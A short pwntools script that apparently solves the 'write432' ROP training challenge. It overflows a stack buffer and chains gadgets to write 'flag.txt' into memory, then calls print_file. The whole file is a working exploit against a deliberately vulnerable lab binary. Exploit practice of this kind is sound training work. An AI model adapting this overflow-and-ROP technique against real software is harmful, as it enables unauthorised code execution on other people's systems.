# t0 - 2025
from pwn import *

context(arch='i386', os='linux')
context.binary = "./write432"

#p = gdb.debug(context.binary.path, '''
#    b *0x08048538
#    continue
#''')
p = process(context.binary.path)

# pop edi, ret and pop ebp, ret
mov_edi_ebp = p32(0x08048543)
print_file = p32(0x08048538)
pop_edi_ebp = p32(0x080485aa)

dss = p32(0x0804a018)
dss_4 = p32(0x0804a018+4)

flag = p32(0x67616c66)
dot_txt = p32(0x7478742e)
padding = "A"*44
padding = padding.encode('ascii')
#    0x8048543 <usefulGadgets>:   mov    DWORD PTR [edi],ebp                        `
payload = padding + pop_edi_ebp + dss + flag + mov_edi_ebp + pop_edi_ebp + dss_4 + dot_txt + mov_edi_ebp + print_file + dss

p.recvuntil("> ")
p.send(payload)
p.interactive()
